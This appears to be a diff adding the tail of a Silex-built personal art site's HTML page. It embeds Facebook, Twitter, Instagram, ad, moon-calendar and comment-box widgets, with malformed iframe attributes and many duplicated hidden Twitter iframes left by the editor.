+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1478366450713-3 section-element paged-element page-es page-en page-br" data-silex-id="silex-id-1478366450713-3" style="">
+        <div data-silex-type="container" class="editable-style silex-element-content silex-id-1478366450713-2 silex-container-content container-element prevent-draggable website-width" data-silex-id="silex-id-1478366450713-2">
+
+
+
+            <div data-silex-type="html" class="editable-style silex-id-1518127547792-0 html-element" data-silex-id="silex-id-1518127547792-0" style="">
+                <div class="silex-element-content">
+                    <div class="fb-like" data-href="https://www.facebook.com/madrugada1000/" data-layout="standard" data-action="like" data-size="large" data-show-faces="true" data-share="false"></div>
+                </div>
+            </div>
+
+
+
+
+
+
+
+
+
+            <div data-silex-type="html" class="editable-style silex-id-1518129201345-2 html-element" data-silex-id="silex-id-1518129201345-2" style="">
+                <div class="silex-element-content"><iframe data-aa="823653" https:="" editor.silex.me="" api="" 1.0="" ftp="" exec="" get="" trindex.htmlhttps:="" index.htmlsrc="" scrolling="no" style="width:120px; height:60px; border:0px; padding:0;overflow:hidden" allowtransparency="true"
+                        data-silex-iframe-src="//ad.a-ads.com/823653?size=120x60" src=""></iframe></div>
+            </div>
+            <div data-silex-type="html" class="editable-style silex-id-1518130058896-4 html-element" data-silex-id="silex-id-1518130058896-4" style="">
+                <div class="silex-element-content"><iframe id="twitter-widget-0" scrolling="no" allowtransparency="true" class="twitter-follow-button twitter-follow-button-rendered" style="position: static; visibility: visible; width: 123px; height: 20px;" title="Twitter Follow Button"
+                        https:="" editor.silex.me="" api="" 1.0="" ftp="" exec="" get="" trindex.htmlhttps:="" index.htmlsrc="" data-screen-name="triptofano" data-silex-iframe-src="https://platform.twitter.com/widgets/follow_button.36c0c29c73929bf937f4c70adb1a29e4.en.html#dnt=false&amp;id=twitter-widget-0&amp;lang=en&amp;screen_name=triptofano&amp;show_count=false&amp;show_screen_name=true&amp;size=m&amp;time=1518182589173"
+                        src="" frameborder="0"></iframe>
+                    <script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1518118247005-7 section-element paged-element page-redes" data-silex-id="silex-id-1518118247005-7">
+        <div data-silex-type="container" class="editable-style silex-id-1518118247004-6 container-element silex-element-content silex-container-content website-width prevent-draggable" data-silex-id="silex-id-1518118247004-6">
+
+
+
+
+
+            <div data-silex-type="html" class="editable-style silex-id-1518469699327-0 html-element" data-silex-id="silex-id-1518469699327-0" style="">
+                <div class="silex-element-content">
+                    <blockquote class="instagram-media" data-instgrm-captioned="" data-instgrm-permalink="https://www.instagram.com/p/BYNs4QRBGdf/" data-instgrm-version="8" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);">
+                        <div style="padding:8px;">
+                            <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:50.0% 0; text-align:center; width:100%;">
+                                <div style=" background:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC'); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div>
+                            </div>
+                            <p style=" margin:8px 0 0 0; padding:0 4px;"> <a href="https://www.instagram.com/p/BYNs4QRBGdf/" style=" color:#000; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none; word-wrap:break-word;" target="_blank">"The Legend of Caboclo D'água" #ACAM #monster #hunt #anfibio #chupacabra #et #fenomeno #sobrenatural #misterio #aventura #frog #boat #impressionismo #nature #fishing #cryptozoology</a></p>
+                            <p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;">A post shared by <a href="https://www.instagram.com/amilton.cores/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px;" target="_blank"> Amilton Cores da Madrugada</a>                                (@amilton.cores) on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-08-25T10:51:59+00:00">Aug 25, 2017 at 3:51am PDT</time></p>
+                        </div>
+                    </blockquote>
+                    <script async="" defer="" src="//platform.instagram.com/en_US/embeds.js"></script>
+                </div>
+            </div>
+            <div data-silex-type="html" class="editable-style silex-id-1518128342871-1 html-element" data-silex-id="silex-id-1518128342871-1" style="">
+                <div class="silex-element-content"><iframe https:="" editor.silex.me="" api="" 1.0="" ftp="" exec="" get="" new="" index.htmlhttps:="" trindex.htmlhttps:="" index.htmlsrc="" style="border:none;overflow:hidden" scrolling="no" allowtransparency="true" data-silex-iframe-src="https://www.facebook.com/plugins/page.php?href=https://www.facebook.com/madrugada1000&amp;tabs=timeline,messages&amp;width=340&amp;height=500&amp;small_header=true&amp;adapt_container_width=true&amp;hide_cover=false&amp;show_facepile=true&amp;appId"
+                        src="https://www.facebook.com/plugins/page.php?href=https://www.facebook.com/madrugada1000&amp;tabs=timeline,messages&amp;width=340&amp;height=500&amp;small_header=true&amp;adapt_container_width=true&amp;hide_cover=false&amp;show_facepile=true&amp;appId"
+                        height="500" frameborder="0" width="340"></iframe></div>
+            </div>
+        </div>
+    </div>
+
+
+
+
+
+    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
+        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
+    <iframe allowtransparency="true" id="emb_xcomm" class="embedly-xcomm" src="https://cdn.embedly.com/widgets/xcomm.html#name=platform&amp;sid=5e73b41684ca451897203fce5269c0f8" style="border: medium none; position: absolute; top: -9999em; width: 10px; height: 10px;"
+        frameborder="0"></iframe>
+
+
+    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
+        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
+
+    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
+        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1518214447359-1 section-element paged-element hide-on-mobile page-es page-en page-br" data-silex-id="silex-id-1518214447359-1">
+        <div data-silex-type="container" class="editable-style silex-id-1518214447356-0 container-element silex-element-content silex-container-content website-width prevent-draggable" data-silex-id="silex-id-1518214447356-0">
+            <div data-silex-type="html" class="editable-style silex-id-1518182593205-0 html-element hide-on-mobile" data-silex-id="silex-id-1518182593205-0" style="" title="Calendario Lunar.">
+                <div class="silex-element-content">
+                    <script type="text/javascript" src="//www.midnightkite.com/mooncalendar.js"></script>
+                </div>
+            </div>
+            <div data-silex-type="html" class="editable-style silex-id-1518216543389-11 html-element" data-silex-id="silex-id-1518216543389-11" style="">
+                <div class="silex-element-content">
+                    <!-- LightWidget WIDGET -->
+                    <script src="//lightwidget.com/widgets/lightwidget.js"></script><iframe https:="" editor.silex.me="" api="" 1.0="" ftp="" exec="" get="" trindex.htmlhttps:="" index.htmlsrc="" scrolling="no" allowtransparency="true" class="lightwidget-widget" style="width: 100%; border: 0; overflow: hidden;"
+                        data-silex-iframe-src="//lightwidget.com/widgets/bea277ccc66e50f38b4932d4bfd0e28c.html" src=""></iframe></div>
+            </div>
+            <div data-silex-type="html" class="editable-style silex-id-1518182949637-1 html-element hide-on-mobile" data-silex-id="silex-id-1518182949637-1" style="" title="Mapa Atual do Ceu segundo a cultura Vedica ou Sideral.">
+                <div class="silex-element-content">
+                    <a href="//vishnuavatars.com/horoscope_for_today.html" target="_blank">
+                        <img src="//vishnuavatars.com/gr_informer.png" style="width:200px;" title="Mapa Atual do Ceu segundo a cultura Vedica ou Sideral." alt="Mapa Atual do Ceu segundo a cultura Vedica ou Sideral.">
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
+        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
+
+    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
+        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
+
+    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
+        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
+
+    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
+        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
+
+    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
+        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
+
+    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
+        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
+
+    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
+        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
+
+    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
+        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
+
+    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https%3A%2F%2Feditor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
+        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
+    <div
+        data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1518469927286-3 section-element page-scrapbook paged-element" data-silex-id="silex-id-1518469927286-3">
+        <div data-silex-type="container" class="editable-style silex-id-1518469927284-2 container-element silex-element-content silex-container-content website-width prevent-draggable" data-silex-id="silex-id-1518469927284-2">
+            <div data-silex-type="html" class="editable-style silex-id-1518469857414-1 html-element" data-silex-id="silex-id-1518469857414-1" style="">
+                <div class="silex-element-content">
+                    <!-- begin wwww.htmlcommentbox.com -->
+                    <div id="HCB_comment_box"><a href="http://www.htmlcommentbox.com">Comment Form</a> carregando comentarios...</div>
+                    <link rel="stylesheet" type="text/css" href="//www.htmlcommentbox.com/static/skins/bootstrap/twitter-bootstrap.css?v=0">
+                    <script type="text/javascript" id="hcb">
+                        /*<!--*/ if(!window.hcb_user){hcb_user={};} (function(){var s=document.createElement("script"), l=hcb_user.PAGE || (""+window.location).replace(/'/g,"%27"), h="//www.htmlcommentbox.com";s.setAttribute("type","text/javascript");s.setAttribute("src", h+"/jread?page="+encodeURIComponent(l).replace("+","%2B")+"&mod=%241%24wq1rdBcg%24iVzQ2nEVkZ1R5AMamkGCu0"+"&opts=16862&num=10&ts=1518469502791");if (typeof s!="undefined") document.getElementsByTagName("head")[0].appendChild(s);})(); /*-->*/
+                    </script>
+                    <!-- end www.htmlcommentbox.com -->
+                </div>
+            </div>
+        </div>
+        </div>
+</body>
+
+</html>
